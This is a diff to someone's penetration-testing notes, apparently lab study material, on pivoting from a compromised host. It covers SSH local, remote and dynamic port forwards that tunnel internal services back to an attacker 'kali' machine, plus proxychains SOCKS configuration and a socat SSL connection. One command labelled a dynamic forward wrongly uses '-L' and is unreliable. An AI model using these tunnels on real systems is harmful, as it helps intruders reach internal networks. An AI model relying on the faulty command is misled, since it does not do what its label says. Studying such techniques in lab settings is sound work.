@@ -1310,7 +1310,11 @@ socat - OPENSSL:10.11.0.4:443,verify=0
 	◇ **OPENSSL:** - Establishes remote connection to SSL listener : ip address : port  
 	◇ **verify=0** - Disables SSL cert verification
 
-##### SSH for a local port forward
+
+## ssh
+- All commands need to be executed on the compromised WAN facing machine.
+
+##### Local Port Forward
 ```bash
 ssh -N -L 0.0.0.0:4455:172.16.163.217:445 database_admin@10.4.163.215
 ```
@@ -1318,13 +1322,36 @@ ssh -N -L 0.0.0.0:4455:172.16.163.217:445 database_admin@10.4.163.215
 	IP:PORT:IP:PORT - First socket is listening socket bound to the SSH client machine.  Second socket is where we want to forward the packets to.
 	database_admin@10.4.163.215 - Rest of the SSH command is as usual; pointed at the SSH server and user we wish to connect as.
 
-##### SSH for dynamic port forward
+##### Local Dynamic Port Forward
 ```bash
 # Only need the listening socket
 ssh -N -L 0.0.0.0:9999 database_admin@10.4.233.215
 ```
 
-##### Proxychains
+##### Remote Port Forward
 ```bash
-
+ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
 ```
+
+##### Remote Dynamic Port Forward
+```bash
+ssh -N -R 9998 kali@192.168.118.4
+```
+
+
+## Proxychains config file
+
+##### Local Dynamic Port Forward
+```bash
+# Last line
+socks5 [Compromised endpoint w/ reverse shell] [port]
+```
+
+##### Remote Dynamic Port Forward
+```bash
+# Last line
+socks5 127.0.0.1 [port]
+```
+
+
+## sshuttle
